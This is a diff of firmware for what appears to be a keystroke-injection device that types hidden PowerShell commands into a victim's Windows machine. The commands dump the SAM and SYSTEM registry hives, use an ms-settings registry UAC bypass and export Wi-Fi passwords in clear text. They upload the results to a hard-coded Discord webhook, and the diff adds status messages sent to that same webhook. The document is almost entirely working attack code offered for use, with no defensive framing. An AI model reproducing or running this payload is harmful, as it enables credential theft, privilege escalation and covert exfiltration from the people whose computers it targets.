@@ -611,7 +611,7 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         Keyboard.print(
             "powershell -w h -nop -ep bypass -c \""
             "$s=$env:TEMP+'\\s.ps1';"
-            "\\\"$t=$env:TEMP+'\\SAM_Backup.zip'; $w=$env:TEMP+'\\r'; mkdir $w -Force; reg save HKLM\\SAM $w'\\sam' /y; reg save HKLM\\SYSTEM $w'\\system' /y; if(Test-Path $w'\\sam'){ Compress-Archive -Path $w\\* -DestinationPath $t -Force; `$h=Get-Item `$t; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -Form `@{file=`$h}; } Remove-Item $w -Recurse -Force; Remove-Item $t -Force;\\\" > $s;"
+            "\\\"Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -ContentType 'application/json' -Body '{\\\"\"content\\\"\":\\\"\"=== SAM Dump Initiated ===\\\"\"}'; $t=$env:TEMP+'\\SAM_Backup.zip'; $w=$env:TEMP+'\\r'; mkdir $w -Force; reg save HKLM\\SAM $w'\\sam' /y; reg save HKLM\\SYSTEM $w'\\system' /y; if(Test-Path $w'\\sam'){ Compress-Archive -Path $w\\* -DestinationPath $t -Force; `$h=Get-Item `$t; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -Form `@{file=`$h}; } Remove-Item $w -Recurse -Force; Remove-Item $t -Force;\\\" > $s;"
             "$rcmd='powershell -w h -nop -ep bypass -f '+$s;"
             "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
             "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;"
@@ -640,6 +640,7 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         Keyboard.print(
             "powershell -w h -nop -ep bypass -c \""
             "$w=$env:TEMP+'\\WIFI';"
+            "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -ContentType 'application/json' -Body '{\\\"content\\\":\\\"=== WiFi Harvest Initiated ===\\\"}';"
             "mkdir $w -Force;"
             "netsh wlan export profile key=clear folder=$w;"
             "if(@(Get-ChildItem $w).Count -gt 0){"
